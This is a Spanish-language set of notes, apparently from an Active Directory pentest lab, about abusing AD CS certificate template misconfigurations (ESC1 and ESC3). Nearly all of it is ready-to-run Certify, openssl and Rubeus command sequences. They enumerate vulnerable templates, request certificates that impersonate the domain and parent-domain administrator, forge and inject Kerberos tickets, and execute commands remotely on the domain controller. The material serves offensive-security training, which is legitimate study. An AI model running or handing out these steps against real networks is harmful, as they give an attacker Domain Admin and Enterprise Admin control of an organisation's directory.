# Vulnerabilidades ESC 

Tags: #AD #ESC 

## Certify

* [Certify](https://github.com/GhostPack/Certify)

```powershell
! Usuario: Usuario de dominio

❯ Certify.exe cas
# Enumerar las Certificate Authorities (CAs) de AD CS en el bosque — muestra CAs enterprise, sus configuraciones y permisos.

❯ Certify.exe find
# Enumerar todas las plantillas de certificados disponibles en el bosque.

❯ Certify.exe find /vulnerable
# Enumerar plantillas de certificados con configuraciones vulnerables — identifica candidatas para ataques ESC1-ESC8.
```

## ESC 1

```powershell
! Usuario: Usuario de dominio con permisos de enrollment en la CA

Paso 1:
❯ Certify.exe find /enrolleeSuppliesSubject
# Enumerar plantillas donde el solicitante puede especificar el Subject Alternative Name (SAN) — identifica plantillas vulnerables a ESC1.
```

La plantilla "HTTPSCertificates" tiene:
- msPKI-Certificates-Name-Flag = `ENROLLEE_SUPPLIES_SUBJECT`
- pkiextendedkeyusage = Client Authentication 
- Enrollment Rights = dcorp\RDPUsers, mcorp\Domain Admins, mcorp\Enterprise Admins

### Escalación a DA

```powershell 
! Usuario: Usuario de dominio con permisos de enrollment en la CA

Paso 2:
# Apunta al administrador del dominio actual -> Escalada DA (Domain Admin)
❯ Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:administrator
# Solicitar un certificado especificando al Administrator como SAN — abusa de ENROLLEE_SUPPLIES_SUBJECT (ESC1) para obtener un certificado válido como DA/EA.
# El ca se obtiene del primer comando del campo 'CA Name'

❯ openssl.exe pkcs12 -in esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc1.pfx
# esc1.pem = Es el certificado obtenido en el comando anterior 
# Solocar la password = SecretPass@123
# esc1.pfx = Es el resultado del comando 

❯ .\Loader.exe -path C:\AD\Rubeus.exe -args asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt
# Solicitar un TGT del Administrator usando el certificado ESC1 obtenido e inyectarlo en la sesión actual — completa la escalada a DA/EA vía ESC1.

❯ klist   # Mirar los tickets de la sesión 

❯ winrs -r:dcorp-dc cmd /c set username   # Ejecutar el comando 'set username' remotamente 
```

### Escalación a EA 

```powershell 
! Usuario: Usuario de dominio con permisos de enrollment en la CA

Paso 2: 
# Apunta al administrador del dominio 'padre' -> Escalada EA (Enterprise Admin)
❯ Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:"HTTPSCertificates" /altname:moneycorp.local\administrator
# El ca se obtiene del primer comando del campo 'CA Name'

❯ openssl.exe pkcs12 -in esc1.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out esc1.pfx
# esc1.pem = Es el certificado obtenido en el comando anterior 
# Solocar la password= SecretPass@123
# esc1.pfx = Es el resultado del comando 

❯ .\Loader.exe -path C:\AD\Rubeus.exe -args asktgt /user:moneycorp.local\administrator /dc:mcorp-dc.moneycorp.local /certificate:esc1.pfx /password:SecretPass@123 /ptt
# Solicitar un TGT del Administrator usando el certificado ESC1 obtenido e inyectarlo en la sesión actual — completa la escalada a DA/EA vía ESC1.

❯ klist   # Mirar los tickets de la sesión 

❯ winrs -r:dcorp-dc cmd /c set username   # Ejecutar el comando 'set username' remotamente 
```

## ESC 3 

- El template **"SmartCardEnrollment-Agent"** permite a los usuarios del dominio inscribirse (_enroll_) y cuenta con el EKU **"Certificate Request Agent"**.

```powershell 
! Usuario: Usuario de dominio

❯ Certify.exe find /vulnerable
# Enumerar plantillas de certificados con configuraciones vulnerables — identifica candidatas para ataques ESC1-ESC8.
```

- El template **"SmartCardEnrollment-Users"** tiene un requisito de emisión (_Application Policy Issuance Requirement_) de **Certificate Request Agent** y además cuenta con un EKU que permite la autenticación en el dominio.
### Escalación a DA

```powershell 
! Usuario: Usuario de dominio con permisos de enrollment en la CA

❯ Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
# Solicitar un certificado de Certificate Request Agent usando la plantilla SmartCardEnrollment-Agent — permite solicitar certificados en nombre de otros usuarios (ESC3).

❯ Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:dcorp\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123
# Usar el certificado de agente (.pfx) para solicitar un certificado en nombre del Administrator usando la plantilla SmartCardEnrollment-Users — convierte cert.pem a .pfx antes de ejecutar.

❯ Rubeus.exe asktgt /user:administrator /certificate:esc3user-DA.pfx /password:SecretPass@123 /ptt
# Solicitar un TGT del Administrator usando el certificado obtenido e inyectarlo en la sesión actual — completa la escalada a DA vía ESC3.
```

### Escalación a EA

```powershell 
! Usuario: Usuario de dominio con certificado de agente (esc3agent.pfx)

❯ Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Users /onbehalfof:moneycorp.local\administrator /enrollcert:esc3agent.pfx /enrollcertpw:SecretPass@123
# Usar el certificado de agente para solicitar un certificado en nombre del Administrator del dominio padre (moneycorp.local) — escalada a Enterprise Admin vía ESC3.

❯ Rubeus.exe asktgt /user:moneycorp.local\administrator /certificate:esc3user.pfx /dc:mcorp-dc.moneycorp.local /password:SecretPass@123 /ptt
# Solicitar un TGT del Administrator del dominio padre usando el certificado obtenido e inyectarlo en la sesión actual — completa la escalada a EA vía ESC3.
```